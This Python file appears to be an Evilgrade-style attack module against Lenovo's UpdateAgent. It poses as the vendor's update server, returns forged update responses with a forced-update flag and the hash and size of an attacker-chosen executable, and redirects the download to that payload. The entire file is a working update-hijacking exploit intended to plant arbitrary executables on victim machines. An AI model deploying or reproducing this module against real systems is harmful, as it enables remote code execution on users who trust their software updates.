from modules import ModuleBase


class Lenovo(ModuleBase):
    name = 'lenovo'
    version = '1.0'
    appver = 'All'
    author = ['Matias Ariel Re Medina <mre[at]infobytesec[dot]com>']
    description = """Lenovo's UpdateAgent""",
    vh = '(susapi.lenovomm.com)' 
    requests = [
        {   'path': '/adpserver/GetVIByAKFWPC',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : """{
                "RES":"SUCCESS",
                "FORMATTYPE":"FTYPE_2",
                "ChannelKey":"null",
                "VerCode":"<%RND1%>",
                "VerName":"<%RND2%>",
                "DownloadURL":"http://susapi.lenovomm.com/aNumdpserver/DLBYREDFOL?pt=windows&id=<%RND3%>&pn=null&vc=<%RND1%>&vn=<%RND2%>&ch=Common&rep1=param1&rep2=param2&rep3=param3&OL=*01*L2FkcEBjbHVzdGVyLTEvMTQyNjgzNTcxMzYzNS9PNEVYTTBRV0tRS1ovMTAwMy9VcGRhdGVBZ2VudC5leGV8LTF8MHww",
                "Size": "<%AGENTSIZE%>",
                "UpdateDesc":"up",
                "FileName":"<%EXENAME%>.exe",
                "CtrlKey":"0",
                "CustKey":"null",
                "PackageID":"<%RND3%>",
                "FPMD5": "<%AGENTMD5%>",
                "ForceUpdate":"<%FORCE%>"
                }""",
            'parse': '1',
            'file': '',
        },
        {   'path': '/adpserver/GetVIByAKSimpFPC',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : """{
                "RES":"SUCCESS",
                "FORMATTYPE":"FTYPE_3",
                "ChannelKey":"null",
                "VerCode":"<%RND1%>",
                "VerName":"<%RND4%>.<%RND4%>",
                "DownloadURL":"http://susapi.lenovomm.com/adpserver/DLBIDFS?ds=<%RND3%>_<%RND3%><%RND1%>",
                "Size": "<%AGENTSIZE%>",
                "UpdateDesc":"up",
                "FileName":"<%EXENAME%>.exe",
                "CtrlKey":"0",
                "CustKey":"null",
                "PackageID":"<%RND3%>",
                "FPMD5": "<%AGENTMD5%>",
                "ForceUpdate":"<%FORCE%>"
                }""",
            'parse': '1',
            'file': '',
        },
        {   'path': '(aNumdpserver/DLBYREDFOL)|(adpserver/DLBIDFS)',
            'type': 'redirect',
            'location': 'http://susapi.lenovomm.com/<%EXENAME%>.exe',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': '1',
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }]
    options = {
        'force': {
            'val': 'Yes',
            'desc': 'Force update? Default yes.'
        },
        'exename': {
            'val': 'UpdateAgent',
            'desc': 'Executable name.'
        },
        'rnd1': {
            'val': 'rand_num(4)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd2': {
            'val': 'rand_alpha(2)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd3': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd4': {
            'val': 'rand_num(1)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd5': {
            'val': 'rand_num(2)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd6': {
            'val': 'rand_num(1)',
            'hidden': 1,
            'dynamic': 1
        },
        'rnd7': {
            'val': 'rand_num(1)',
            'hidden': 1,
            'dynamic': 1
        },
    }
